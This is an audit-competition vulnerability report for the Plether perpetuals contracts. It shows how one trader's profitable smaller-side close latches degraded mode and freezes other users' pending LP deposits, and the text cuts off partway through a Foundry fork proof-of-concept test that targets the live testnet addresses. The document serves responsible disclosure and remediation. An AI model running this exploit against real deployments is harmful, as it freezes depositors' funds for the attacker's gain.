# \#98328 [SC-High] in a pool at admission capacity, one unprivileged smaller-side trader's profitable close latches `degradedMode` and freezes other users' pending LP deposits long after it has exited

**Submitted on Nov 7th 2026 at 03:04:27 UTC by @emanueldlvg for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98328
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Affected contracts (in-scope commit `a82d4fef`; identical runtime code live on Arbitrum Sepolia v2.0.0)

The v2.0.0 runtime bytecode of every contract below matches an `a82d4fef` build, excluding immutables and metadata (Arbitrum Sepolia block 325,810,548). The live risk, Router and pool configuration equals the release parameters in `packages/perps/DEPLOYMENT.md`.

The proof of concept is a local fork of this deployment at Arbitrum Sepolia L2 block 325,848,265, with its 102.06M USDG pool and live trader book. Only out-of-scope parts are replaced:
- Pyth price updates come from the suite's `MockPyth`, etched at the deployment's Pyth address and seeded with the six live feed prices;
- mock-USDG balances are provisioned with `deal`;
- a one-line `ArbSys` stand-in returns the fork's block number, because Foundry has no Arbitrum precompile.

| Contract | Arbitrum Sepolia v2.0.0 address | Role in the issue |
|---|---|---|
| `CfdEngine` | `0xca18a6783d7542f9d2f28f4f259772b74c4d6baa` | Latches `degradedMode` after a close; only the owner can clear it, and only once `E >= L` |
| `CfdEnginePlanner` (`CfdEnginePlanLib`) | `0x802a0755413fb966b397155b5c5cc0198e6bed3f` | Open admission checks only the larger side's liability `max(long, short)` plus a 25 bps buffer |
| `HousePool` | `0xeb5604c393843b2f3c347ec24fa9ddad6ab2131e` | `settleLpEpoch` reverts while degraded; afterwards, owner-injected assets keep blocking deposit activation until assigned |
| `TrancheVault` (Senior) | `0x5dc42ba5a1e8dd3e1b6868d10f66a9bf8fb5b83d` | `cancelPendingDeposit` reverts for every committed Senior request |
| `TrancheVault` (Junior) | `0x4a8b67184a1e3224c11a191cc69f22c50eef734e` | `cancelPendingDeposit` reverts for every matured Junior request |
| `OrderRouter` | `0x918663d6da8cb33b325a04c4a5e8c51d42f3b444` | Public `commitOrder` / `executeOrder` / `settleLpEpoch` / `executeLiquidation` used by the traders and the victims |
| `PletherOracle` | `0x4f2c62a0e03657f52c633c19c11f88d8f0897bb2` | Six-feed basket; its Pyth dependency is the only replaced price source |

Live configuration read from the deployment:
- risk: `vpiFactor` 0.01e18, `maxSkewRatio` 0.4e18, maintenance 10 bps, initial 20 bps, frozen-market 300 bps, `baseCarryBps` 500, liquidation `bountyBps` 10 with a 50% keeper share;
- execution fee 4 bps, `settlementBufferBps` 25;
- Senior cap 40,000,000 USDG and 80% of the pool;
- Router execution window 60 s, at most 5 pending orders.

## Brief/Intro

Open admission sizes pool capacity with only the larger side's aggregate maximum profit, `L = max(longMaxProfit, shortMaxProfit)`, plus a 25 bps settlement buffer. Positions on the smaller side therefore consume no capacity. When the pool is full, the only cushion between pool cash and `L` is about 0.25% of `L`.

A profitable close on the smaller side pays cash out of the pool and leaves `L` untouched. If the net payout exceeds the cushion, `CfdEngine._enterDegradedModeIfInsolvent` latches `degradedMode`. Any unprivileged trader can arrange that close deliberately, with a smaller-side position large enough for an ordinary basket move.

Once the flag is set:
- `HousePool.settleLpEpoch` reverts for every caller;
- new deposit requests and new opens are refused;
- `TrancheVault.cancelPendingDeposit` reverts for every committed Senior request and every matured Junior request.

USDG that other users have already moved into vault escrow is neither activated nor refundable. The trigger needs no ongoing position: the larger side, held by ordinary traders, keeps `L` up. No depositor or keeper action ends the state. The flag does not clear itself even when `E >= L` returns. In the proof, the deposits are released only after three owner actions:
1. the owner injects the shortfall from its own USDG;
2. it calls `clearDegradedMode()`;
3. it assigns the injected, otherwise ownerless, pool assets, which keep blocking deposit activation until then.

The proof forks the live v2.0.0 deployment:
- **Setup.** Ordinary traders fill the 102.05M USDG pool to its admission capacity with a LONG-heavy book: `L = 101.79M` USDG, and only 261,553.15 USDG of headroom.
- **Attacker position.** The attacker holds only a 28.77M USDG SHORT on the smaller side, about 28% of the pool.
- **Trigger.** After an ordinary +1.50% basket move, it closes that SHORT through the public Router. The pool ends 76,947.84 USDG short of `L`, and the flag latches.
- **Freeze.** The attacker now holds nothing, yet a 100,000 USDG Senior deposit and a 200,000 USDG Junior deposit belonging to other users stay frozen for 86,404 seconds. Every exit the depositors can call is retried each hour and reverts, and the hourly `E − L` never changes.
- **Attacker result.** The attacker ends +331,844.79 USDG: a 431,600.49 USDG price gain minus 99,755.70 USDG of fees and net VPI.

## Vulnerability Details

### Admission counts only the larger side, so a full pool keeps a 25 bps cushion

Every open must leave the pool with `E >= L + B` (`CfdEnginePlanLib._applyOpenSettlementBufferAfterPlan`, lines 698–780, and `SolvencyAccountingLib.hasRequiredSettlementBuffer`, lines 93–103). Here `E` is pool cash net of trader claims, `L = getMaxLiability(longMaxProfit, shortMaxProfit)`, and `B = ceil(L × 25 / 10,000)`:

```solidity
SolvencyAccountingLib.getMaxLiability(snap.longSide.maxProfitAssets, snap.shortSide.maxProfitAssets),
...
satisfied = SolvencyAccountingLib.hasRequiredSettlementBuffer(
    result.effectiveAssetsAfterAssets, result.maxLiabilityAfterAssets, snap.settlementBufferBps
);
```

A LONG's maximum profit is its entry cost, and a SHORT's is `lots × (CAP_PRICE − entry)` (`CfdMath.calculateExactMaxProfit`, lines 76–90).

On the fork, ordinary traders' interleaved opens bring the LONG side to `L = 101,793,440.405709 USDG` and the SHORT side to 93,650,027.341369 USDG. The SHORT side includes the attacker's position, which was opened while it added no `L`. The pool holds 102,054,993.554737 USDG. The cushion over `L` is 261,553.149028 USDG, barely above `B = 254,483.60 USDG`, which is the state the admission gate holds a full pool in.

### A profitable smaller-side close latches the Engine's raw-solvency flag

`CfdEngine._applyClose` calls `_enterDegradedModeIfInsolvent` after every close (line 1320). It latches the flag as soon as available cash falls below `_maxLiability()` (lines 1351–1369):

```solidity
uint256 effectiveAssetsAfter = _availableCashForFreshPoolPayouts();
...
uint256 maxLiabilityAssets = _maxLiability();
if (effectiveAssetsAfter < maxLiabilityAssets) {
    degradedMode = true;
    emit DegradedModeEntered(effectiveAssetsAfter, maxLiabilityAssets, account);
}
```

Closing a SHORT never lowers the LONG side's maximum profit, so `L` stays 101,793,440.405709 USDG. On the fork, the +1.50% move gives the attacker's SHORT a 431,600.49 USDG price gain. The close nets 338,500.99 USDG of cash out of the pool after its VPI and execution fee, exceeding the 261,553.15 USDG cushion. Pool assets end at 101,716,492.565752 USDG, `E` is 76,947.84 USDG below `L`, and the binary latch is set.

### Degraded mode blocks every activation and refund path for pending deposits

- **Activation.** `HousePool.settleLpEpoch` → `_settleLpEpoch` → `_requireWithdrawalsLive` reverts with `HousePool__DegradedMode` (HousePool.sol lines 797–831 and 1864–1869). No deposit epoch is activated and no claimable shares are created. The Router path, `OrderRouter.settleLpEpoch`, is permissionless and reverts the same way.
- **Refund.** `TrancheVault.cancelPendingDeposit` refunds only a Junior request that has not matured, a rejected epoch, a Senior request during an explicit settlement hold, a projected terminal wipe or Senior impairment (TrancheVault.sol lines 851–860):

```solidity
if (
    (IS_SENIOR || currentLpEpoch() >= requestId) && !queueState.rejected
        && (!IS_SENIOR || !POOL.lpEpochSettlementPaused()) && !_projectedTerminalWipe()
        && !POOL.isSeniorImpairedAfterPendingDepositReconcile()
) {
    if (IS_SENIOR) {
        revert TrancheVault__SeniorDepositCommitted();
    }
    revert TrancheVault__DepositEpochAlreadyActive();
}
```

  Degraded mode is not one of those conditions. So a committed Senior request is frozen however recently it was made, and a matured Junior request is frozen too.
- **No self-cure.** While degraded, `_entryStatusBlocked` returns true (HousePool.sol lines 1141–1148), so new deposit requests are refused. Fresh LP capital, which would restore `E >= L`, cannot enter.

### The freeze outlives the trigger, and only owner actions end it

- **The trigger is finished.** After its close the attacker holds no position. Ordinary traders on the LONG side keep `L` at 101,793,440.405709 USDG.
- **Nothing heals the gap.** Carry on their positions is not realized into pool cash while they are untouched. On the fork, `E − L` stays at −76,947.84 USDG at every hourly check for 24 hours.
- **Clearing needs the owner.** `clearDegradedMode()` is `onlyOwner` and reverts `CfdEngine__StillInsolvent` while `E < L` (CfdEngine.sol lines 658–667). Raw solvency returns only through larger-side traders closing at a loss, other pool income, or an owner `recapitalizePool` from the owner's own USDG.
- **Clearing is not enough.** An owner recapitalization is routed to Senior restoration or to `unassignedAssets` (ACCOUNTING_SPEC.md lines 639–642). Unassigned assets block deposit activation (`HousePoolTrancheGateLib.trancheDepositsAllowed`, lines 19–41).
- **What the proof shows.** After the owner injects 76,948.84 USDG and clears the flag, `settleLpEpoch` still reverts with `HousePool__NoLpEpochProgress`. Only after a third owner call, `assignUnassignedAssets`, does a settlement activate the deposits.

The program states that no detection or response deadline is assumed, and that the existence of administrative controls alone does not justify a downgrade.

### Relation to documentation and published findings

`SECURITY.md` describes degraded mode as containment for a close or liquidation that leaves `E < L`, and the emergency guide says it blocks LP epoch settlement. Neither text, nor any known-issue section or published audit item, covers three points:
- a single smaller-side trader in a full pool can trigger the latch on purpose, because smaller-side exposure consumes no capacity while its realized gain is paid in cash;
- pending deposits have no exit while degraded: the Known Limitations list escrow recovery only for an explicit settlement hold, projected terminal wipe, Senior impairment or epoch rejection;
- the release requires the owner to inject cash, clear the flag and assign the injected assets, because the cure that new deposits would provide is blocked.

Cecuro LOW-73 (no new stop-loss protection in degraded mode) is about trader protection, not LP escrow.

## Exploitation

The proof of concept forks the live Arbitrum Sepolia v2.0.0 deployment. Every order goes through the public V3 `commitOrder` / `executeOrder` path, and LP settlement through the public `OrderRouter.settleLpEpoch`. No in-scope contract and no configuration is modified. Prices come from the six live feed prices, served by the suite's `MockPyth` at the deployment's Pyth address.

1. At fork block 325,848,265 the pool holds 102,058,191.066798 USDG, and the live book carries 15,974,921.589514 USDG LONG and 213,721.762594 USDG SHORT maximum profit, at a basket mark of 0.97024565. The order queue is empty and the Engine is not degraded.
2. Ordinary demand fills the pool. The attacker's 28,773,216.898140 USDG SHORT, with 4% margin from 3,000,000 USDG of collateral, is opened first. Ordinary traders then add 85,818,518.816195 USDG LONG and 59,263,477.523085 USDG SHORT notional in interleaved chunks, each within `maxSkewRatio`. Afterwards `L = 101,793,440.405709 USDG`, the SHORT side carries 93,650,027.341369 USDG, pool assets are 102,054,993.554737 USDG, and the cushion `E − L` is 261,553.149028 USDG.
3. Other users request ordinary LP deposits: 100,000 USDG into the Senior vault and 200,000 USDG into the Junior vault. The next LP epoch starts, so the Junior request is mature.
4. The basket moves +1.50%. The attacker commits and executes the close of its whole SHORT. Pool assets fall to 101,716,492.565752 USDG, `L` stays 101,793,440.405709 USDG, and `degradedMode` is latched. The attacker holds no position.
5. Every hour for 86,404 seconds:
   - each depositor's `cancelPendingDeposit` reverts with `TrancheVault__SeniorDepositCommitted` or `TrancheVault__DepositEpochAlreadyActive`;
   - a depositor's `OrderRouter.settleLpEpoch` reverts with `HousePool__DegradedMode`;
   - the owner's `clearDegradedMode` reverts with `CfdEngine__StillInsolvent`.

   Both escrows keep exactly the deposited amounts, nothing becomes claimable, and `E − L` is −76,947.84 USDG at every check.
6. The attacker's clearinghouse balance ends 331,844.785908 USDG above its collateral: the 431,600.485056 USDG price gain on its SHORT minus 99,755.699148 USDG of execution fees and net VPI.
7. The owner injects 76,948.84 USDG from its own wallet with `recapitalizePool` and calls `clearDegradedMode()`. A settlement still reverts with `HousePool__NoLpEpochProgress`. After the owner's `assignUnassignedAssets`, one settlement activates both deposits.
8. Control: from the same full book and deposits at the same +1.50% price, without the attacker's close, a single settlement activates both deposits.
9. Worst case for the attacker, when ordinary demand has not filled the pool, which is the live testnet's state: the same file shows that the attacker can fill the capacity itself with a hedged LONG/SHORT pair and close the winning leg. That run latches with a 108,733.33 USDG shortfall and costs the attacker 584,819.11 USDG.

## Impact Details

Funds owned by other users are frozen: USDG that depositors have transferred into Senior and Junior vault escrow. This USDG is not exposed to trading risk and is not part of pool liquidity. The depositors cannot cancel and nothing can be activated. The freeze continues after the attacker has exited. The proof holds it for 86,404 seconds with the attacker holding nothing, and it ends only through owner actions that include paying the shortfall from the owner's own funds. This is temporary freezing of funds for at least 24 hours (High).

Every deposit pending at the moment of the latch is affected:
- a committed Senior request is caught whenever it was made;
- a Junior request is caught once its one-hour epoch has matured, so the attacker lands its close just after an epoch boundary, before the next settlement.

The same latch also stops all LP redemption funding and all risk-increasing opens for every trader.

**Attacker requirements.**
- **Privilege:** none. The attacker needs only a smaller-side position in a pool that ordinary demand has filled to admission capacity, the state the admission gate holds a busy pool in. The required size is roughly the cushion plus close charges, divided by the basket move. The proof uses 28% of the pool and a routine +1.50% move.
- **Profit:** the attacker ends +331,844.79 USDG. The program's griefing downgrade applies only where the attacker gains no profit.
- **If the price exposure is hedged off-chain:** the on-chain cost is the 99,755.70 USDG of fees and net VPI. That is about 0.35% of the position, and the owner must additionally pay the 76,947.84 USDG shortfall to release the pool.
- **If the pool is not full:** the worst-case run shows the attacker can fill it itself for 584,819.11 USDG.

If the triager weighs the hedged on-chain cost against the 300,000 USDG frozen in the proof, the fallback classification is Medium: griefing, and temporary freezing of funds for at least one hour.

## Recommendation

Give pending deposits an exit, and stop a single smaller-side close from tripping a full pool.

1. **Treat degraded mode as an escrow-recovery condition.** In `TrancheVault.cancelPendingDeposit`, allow cancellation of a committed Senior request and a matured Junior request while `ENGINE.degradedMode()` is true, as the explicit settlement hold already does for Senior. This removes the freeze without changing the solvency logic.
2. **Size admission for realizable smaller-side gains, not only the larger side's maximum profit.** The buffer that closes may consume should cover the cash that winning smaller-side closes can pay out before the larger side's liability falls. For example, scale `B` with the smaller side's open interest, or count the larger side's mark-to-market loss as a pool receivable in the raw-solvency check before latching.
3. Let deposits that would restore `E >= L` activate, and give owner recapitalization a claimant path that does not leave `unassignedAssets` blocking activation.
4. Add a regression test that fills the pool to capacity, closes a winning smaller-side position after a move just above the buffer, and asserts that pending deposits remain refundable.

## Proof of Concept

Save the test below as `packages/perps/test/perps/poc/DegradedLatchDepositFreezeFork.t.sol` and run it from the repository root. `FORK_BLOCK` pins the run's block and needs an archive-capable RPC; without it the test forks the latest block, which any public Arbitrum Sepolia RPC serves.

```bash
ARBITRUM_SEPOLIA_RPC_URL='<Arbitrum Sepolia RPC URL>' FORK_BLOCK=325848265 \
  forge test --root packages/perps --match-contract DegradedLatchDepositFreezeForkPoC -vv
```

The file contains three tests:
- the main last-actor scenario;
- its control;
- the worst case where the attacker fills the capacity itself.

It forks the live v2.0.0 contracts and changes no in-scope code or configuration. Before the first order it reads each basket feed's price from the deployment's Pyth contract. It then etches the suite's `MockPyth` at that address, so the run can deliver signed-update stand-ins at those live prices and at the basket moves. That is a Pyth price-update mock, which the program allows. Mock-USDG balances are provisioned with `deal`. Foundry has no Arbitrum precompiles, so a stand-in at the `ArbSys` address returns the fork's block number to `ExecutionBlockNumberLib`. The ordinary traders are two aggregate accounts representing the existing market demand that fills the pool.

### Complete test:

<details>
<summary>Complete test </summary>

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {Test} from "forge-std/Test.sol";

/// @notice Read-only view of the live Pyth contract, used once to seed the mock with the deployment's own prices.
interface ILivePyth {

    struct Price {
        int64 price;
        uint64 conf;
        int32 expo;
        uint256 publishTime;
    }

    function getPriceUnsafe(
        bytes32 id
    ) external view returns (Price memory);

}

/// @notice Foundry has no Arbitrum precompiles. The in-scope `ExecutionBlockNumberLib` reads the L2 block number from
///         ArbSys on chain 421614; this stand-in returns the local fork's block number.
contract ArbSysBlockNumberStandIn {

    function arbBlockNumber() external view returns (uint256) {
        return block.number;
    }

}

/// @notice Fork of the live Arbitrum Sepolia v2.0.0 deployment (in-scope code, release parameters, 102.1M USDG pool and
///         its existing book). Only Pyth price updates (the suite's MockPyth, seeded with the live feed prices) and
///         mock-USDG balances are mocked.
///
///         Main scenario: ordinary traders have filled the pool to its admission capacity with a LONG-heavy book. An
///         unprivileged trader holds only a SHORT on the smaller side, which does not consume capacity. After an
///         ordinary +1.5% basket move it closes that winning SHORT. The close pays cash while the LONG side keeps the
///         pool's maximum liability, so raw `E < L` and the Engine latches `degradedMode`. The attacker then holds
///         nothing, yet other users' pending LP deposits are neither activated nor refundable for more than 24 hours,
///         and only an owner cash injection of the shortfall plus `clearDegradedMode()` releases them.
contract DegradedLatchDepositFreezeForkPoC is Test {

    // Arbitrum Sepolia v2.0.0 (deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/addresses.env).
    CfdEngine internal constant ENGINE = CfdEngine(address(bytes20(hex"ca18a6783d7542f9d2f28f4f259772b74c4d6baa")));
    OrderRouter internal constant ROUTER =
        OrderRouter(payable(address(bytes20(hex"918663d6da8cb33b325a04c4a5e8c51d42f3b444"))));
    HousePool internal constant POOL = HousePool(address(bytes20(hex"eb5604c393843b2f3c347ec24fa9ddad6ab2131e")));
    TrancheVault internal constant SENIOR_VAULT =
        TrancheVault(address(bytes20(hex"5dc42ba5a1e8dd3e1b6868d10f66a9bf8fb5b83d")));
    TrancheVault internal constant JUNIOR_VAULT =
        TrancheVault(address(bytes20(hex"4a8b67184a1e3224c11a191cc69f22c50eef734e")));
    MarginClearinghouse internal constant CLEARINGHOUSE =
        MarginClearinghouse(address(bytes20(hex"b5b851f627d6df3cf3f096e23e20a58884d7b89a")));
    PletherOracle internal constant ORACLE =
        PletherOracle(payable(address(bytes20(hex"4f2c62a0e03657f52c633c19c11f88d8f0897bb2"))));
    IERC20 internal constant USDG = IERC20(address(bytes20(hex"3d051dbbf5ff427a4ae8ad09746902666af8fb9d")));
    address internal constant OWNER = address(bytes20(hex"5a71a4094ec81165ada48aa4c27da48ec27e0d6b"));

    address internal constant ORGANIC_LONG = address(0x0711); // ordinary LONG traders (aggregate)
    address internal constant ORGANIC_SHORT = address(0x0712); // ordinary SHORT traders (aggregate)
    address internal constant ATTACKER = address(0xBADBAD); // holds only a smaller-side SHORT
    address internal constant HEDGE_LONG = address(0xA770C1); // worst case: the attacker fills capacity itself
    address internal constant HEDGE_SHORT = address(0xA770C2);
    address internal constant SENIOR_DEPOSITOR = address(0x5E1105);
    address internal constant JUNIOR_DEPOSITOR = address(0x1D1105);
    address internal constant KEEPER = address(0xE0EC);

    uint256 internal constant LAST_ACTOR_MOVE_BPS = 150; // an ordinary +1.50% basket move
    uint256 internal constant WORST_CASE_MOVE_BPS = 100; // +1.00%
    uint256 internal constant ATTACKER_SHARE_BPS = 3000; // attacker SHORT = 30% of capacity, in max-profit terms
    uint256 internal constant SHORT_SIDE_SHARE_BPS = 9200; // whole SHORT side = 92% of capacity (LONG side = 100%)
    uint256 internal constant MAX_CHUNK_PROFIT = 15_000_000e6; // keeps every interleaved open inside maxSkewRatio
    uint256 internal constant MARGIN_BPS = 400; // 4% of each chunk's notional
    uint256 internal constant SENIOR_DEPOSIT = 100_000e6;
    uint256 internal constant JUNIOR_DEPOSIT = 200_000e6;

    bytes32[] internal feedIds;
    bool[] internal inverted;
    int64[] internal livePrices; // expo -8
    uint256 internal orderNonce;
    uint256 internal seniorEscrowBase;
    uint256 internal juniorEscrowBase;

    function setUp() public {
        // Public Arbitrum Sepolia RPCs serve only recent state: fork the latest block unless FORK_BLOCK is set
        // (an archive RPC can pin any block at or after the v2.0.0 deployment).
        string memory url = vm.envString("ARBITRUM_SEPOLIA_RPC_URL");
        uint256 forkBlock = vm.envOr("FORK_BLOCK", uint256(0));
        if (forkBlock == 0) {
            vm.createSelectFork(url);
        } else {
            vm.createSelectFork(url, forkBlock);
        }
        assertEq(block.chainid, 421_614, "not Arbitrum Sepolia");
        emit log_named_uint("fork timestamp", vm.getBlockTimestamp());
        assertEq(ROUTER.nextExecuteId(), 0, "live order queue not empty at the fork block");
        assertFalse(ENGINE.degradedMode(), "already degraded");

        // Seed the mock with the deployment's current feed prices, then replace Pyth (price updates only).
        address pyth = address(ORACLE.pyth());
        for (uint256 i; i < 6; ++i) {
            bytes32 id = ORACLE.pythFeedIds(i);
            ILivePyth.Price memory p = ILivePyth(pyth).getPriceUnsafe(id);
            feedIds.push(id);
            inverted.push(ORACLE.inversions(i));
            livePrices.push(_toExpoMinus8(p.price, p.expo));
        }
        vm.etch(pyth, address(new MockPyth()).code);
        for (uint256 slot; slot < 16; ++slot) {
            vm.store(pyth, bytes32(slot), bytes32(0));
        }
        MockPyth(pyth).setSynchronizeLegacyUniquePrices(true);
        vm.etch(address(100), address(new ArbSysBlockNumberStandIn()).code);
        _refreshMark(0);
    }

    // ---------------------------------------------------------------------------------------------------------------
    // Main scenario: the attacker is only a smaller-side trader in a pool that ordinary demand has filled.
    // ---------------------------------------------------------------------------------------------------------------

    function test_Fork_LastActor_SmallerSideCloseFreezesPendingLpDepositsForOver24Hours() external {
        _logLiveState();
        uint256 attackerFunding = _buildFullBookWithAttackerShort();
        uint256 attackerLots = _lots(ATTACKER);
        uint256 openMark = ENGINE.lastMarkPrice();

        (uint256 seniorRequest, uint256 juniorRequest) = _requestVictimDeposits();
        _warpToMaturity(juniorRequest);

        // +1.5% basket move: the attacker closes its winning smaller-side SHORT through the public Router.
        _refreshMark(LAST_ACTOR_MOVE_BPS);
        _closeAll(ATTACKER, CfdTypes.Side.SHORT, LAST_ACTOR_MOVE_BPS);
        uint256 closeMark = ENGINE.lastMarkPrice();
        assertTrue(ENGINE.degradedMode(), "smaller-side close did not latch degraded mode");
        (uint256 shortfall, uint256 liability) = _logLatch();
        assertEq(_lots(ATTACKER), 0, "attacker still holds a position");

        // The attacker holds nothing. Every hour for 24 hours, the victims retry every permissionless exit.
        uint256 frozenStart = vm.getBlockTimestamp();
        _holdAndAssertFrozen(seniorRequest, juniorRequest, LAST_ACTOR_MOVE_BPS, 24 hours + 1);
        emit log_named_uint("deposit freeze duration (seconds)", vm.getBlockTimestamp() - frozenStart);
        (uint256 liabilityAfter,,,) = ENGINE.sides(uint256(CfdTypes.Side.LONG));
        assertEq(liabilityAfter, liability, "the ordinary LONG book changed");

        // The attacker's result: price gain on its SHORT, minus fees and VPI paid on the way in and out.
        int256 attackerNet = int256(CLEARINGHOUSE.balanceAssets(ATTACKER)) - int256(attackerFunding);
        int256 priceGain = int256(attackerLots) * (int256(closeMark) - int256(openMark));
        emit log_named_decimal_int("attacker net on-chain result (USDG; + = gain)", attackerNet, 6);
        emit log_named_decimal_int("  of which the SHORT's price gain (USDG)", priceGain, 6);
        emit log_named_decimal_int("  of which fees and net VPI paid (USDG)", attackerNet - priceGain, 6);

        // Only three owner actions release the deposits: inject the shortfall from the owner's own USDG, clear the
        // latch, and assign the injected (ownerless) assets, which otherwise keep blocking deposit activation.
        uint256 injection = shortfall + 1e6;
        _deal(OWNER, injection);
        vm.startPrank(OWNER);
        USDG.approve(address(ENGINE), injection);
        ENGINE.recapitalizePool(injection);
        ENGINE.clearDegradedMode();
        vm.stopPrank();
        _nextBlock();
        bytes[] memory tick = _ticks(LAST_ACTOR_MOVE_BPS, vm.getBlockTimestamp(), ENGINE.lastMarkTime());
        vm.prank(KEEPER);
        vm.expectRevert(bytes4(keccak256("HousePool__NoLpEpochProgress()")));
        ROUTER.settleLpEpoch(tick);
        _refreshMark(LAST_ACTOR_MOVE_BPS);
        vm.prank(OWNER);
        POOL.assignUnassignedAssets(false, OWNER);
        _settleViaRouter(LAST_ACTOR_MOVE_BPS);
        assertEq(SENIOR_VAULT.claimableDepositRequest(seniorRequest, SENIOR_DEPOSITOR), SENIOR_DEPOSIT, "senior");
        assertEq(JUNIOR_VAULT.claimableDepositRequest(juniorRequest, JUNIOR_DEPOSITOR), JUNIOR_DEPOSIT, "junior");
        emit log_named_decimal_uint("owner cash injection needed to release the deposits (USDG)", injection, 6);
        emit log_named_decimal_uint("other users' USDG frozen for the period (USDG)", SENIOR_DEPOSIT + JUNIOR_DEPOSIT, 6);
    }

    /// @notice Control: the same full book, deposits and +1.5% move without the attacker's close. One settlement
    ///         activates both deposits.
    function test_Fork_LastActor_Control_WithoutTheCloseDepositsActivate() external {
        _buildFullBookWithAttackerShort();
        (uint256 seniorRequest, uint256 juniorRequest) = _requestVictimDeposits();
        _warpToMaturity(juniorRequest);
        _refreshMark(LAST_ACTOR_MOVE_BPS);
        _settleViaRouter(LAST_ACTOR_MOVE_BPS);
        assertFalse(ENGINE.degradedMode(), "control latched");
        assertEq(SENIOR_VAULT.claimableDepositRequest(seniorRequest, SENIOR_DEPOSITOR), SENIOR_DEPOSIT, "senior");
        assertEq(JUNIOR_VAULT.claimableDepositRequest(juniorRequest, JUNIOR_DEPOSITOR), JUNIOR_DEPOSIT, "junior");
    }

    // ---------------------------------------------------------------------------------------------------------------
    // Worst case for the attacker: the live pool is not full, so it fills the capacity itself with a hedged pair.
    // ---------------------------------------------------------------------------------------------------------------

    function test_Fork_WorstCase_AttackerFillsCapacityItselfWithAHedgedPair() external {
        address treasury = ENGINE.protocolTreasury();
        uint256 treasuryStart = CLEARINGHOUSE.balanceAssets(treasury);
        uint256 poolStart = POOL.totalAssets();
        uint256 funding = 8_000_000e6;
        _fund(HEDGE_LONG, funding);
        _fund(HEDGE_SHORT, funding);

        // 0.30% below E: the buffer is 0.25%, and VPI rebates on the first chunks against the live skew are paid out.
        uint256 target = (poolStart - ENGINE.totalTraderClaimBalanceAssets()) * 10_000 / 10_030;
        _fill(HEDGE_LONG, HEDGE_SHORT, address(0), target, target, 0);
        emit log_named_decimal_uint("worst case: attacker LONG notional (USDG)", _lots(HEDGE_LONG) * ENGINE.lastMarkPrice(), 6);
        emit log_named_decimal_uint("worst case: attacker SHORT notional (USDG)", _lots(HEDGE_SHORT) * ENGINE.lastMarkPrice(), 6);

        (uint256 seniorRequest, uint256 juniorRequest) = _requestVictimDeposits();
        _warpToMaturity(juniorRequest);
        _refreshMark(WORST_CASE_MOVE_BPS);
        _closeAll(HEDGE_SHORT, CfdTypes.Side.SHORT, WORST_CASE_MOVE_BPS);
        assertTrue(ENGINE.degradedMode(), "winning-leg close did not latch degraded mode");
        _logLatch();

        _holdAndAssertFrozen(seniorRequest, juniorRequest, WORST_CASE_MOVE_BPS, 24 hours + 1);
        _nextBlock();
        bytes[] memory tick = _ticks(WORST_CASE_MOVE_BPS, vm.getBlockTimestamp(), ENGINE.lastMarkTime());
        vm.prank(KEEPER);
        vm.expectRevert();
        ROUTER.executeLiquidation(HEDGE_LONG, tick);

        _closeAll(HEDGE_LONG, CfdTypes.Side.LONG, WORST_CASE_MOVE_BPS);
        assertTrue(ENGINE.degradedMode(), "latch cleared itself");
        vm.prank(OWNER);
        ENGINE.clearDegradedMode();
        _settleViaRouter(WORST_CASE_MOVE_BPS);
        assertEq(SENIOR_VAULT.claimableDepositRequest(seniorRequest, SENIOR_DEPOSITOR), SENIOR_DEPOSIT, "senior");
        assertEq(JUNIOR_VAULT.claimableDepositRequest(juniorRequest, JUNIOR_DEPOSITOR), JUNIOR_DEPOSIT, "junior");

        uint256 cost = 2 * funding - CLEARINGHOUSE.balanceAssets(HEDGE_LONG) - CLEARINGHOUSE.balanceAssets(HEDGE_SHORT);
        emit log_named_decimal_uint("worst case: attacker total cost (USDG)", cost, 6);
        emit log_named_decimal_uint(
            "worst case: execution fees to the treasury (USDG)", CLEARINGHOUSE.balanceAssets(treasury) - treasuryStart, 6
        );
    }

    // --- Scenario steps ---

    function _logLiveState() internal {
        (uint256 liveLong,,,) = ENGINE.sides(uint256(CfdTypes.Side.LONG));
        (uint256 liveShort,,,) = ENGINE.sides(uint256(CfdTypes.Side.SHORT));
        emit log_named_decimal_uint("live pool assets (USDG)", POOL.totalAssets(), 6);
        emit log_named_decimal_uint("live LONG aggregate max profit (USDG)", liveLong, 6);
        emit log_named_decimal_uint("live SHORT aggregate max profit (USDG)", liveShort, 6);
        emit log_named_decimal_uint("live basket mark price (8 decimals)", ENGINE.lastMarkPrice(), 8);
    }

    /// @dev Ordinary traders fill the LONG side to the admission capacity and the SHORT side to 92% of it; the attacker
    ///      holds 30% of capacity on the SHORT side. The attacker opens first and every chunk stays within maxSkewRatio.
    function _buildFullBookWithAttackerShort() internal returns (uint256 attackerFunding) {
        uint256 target = (POOL.totalAssets() - ENGINE.totalTraderClaimBalanceAssets()) * 10_000 / 10_026;
        (uint256 liveShort,,,) = ENGINE.sides(uint256(CfdTypes.Side.SHORT));
        uint256 attackerProfit = target * ATTACKER_SHARE_BPS / 10_000;
        attackerFunding = 3_000_000e6;
        _fund(ORGANIC_LONG, 6_000_000e6);
        _fund(ORGANIC_SHORT, 4_000_000e6);
        _fund(ATTACKER, attackerFunding);

        _fill(ORGANIC_LONG, ORGANIC_SHORT, ATTACKER, target, target * SHORT_SIDE_SHARE_BPS / 10_000, liveShort + attackerProfit);

        (uint256 longMaxProfit,,,) = ENGINE.sides(uint256(CfdTypes.Side.LONG));
        (uint256 shortMaxProfit,,,) = ENGINE.sides(uint256(CfdTypes.Side.SHORT));
        emit log_named_decimal_uint("ordinary LONG notional added (USDG)", _lots(ORGANIC_LONG) * ENGINE.lastMarkPrice(), 6);
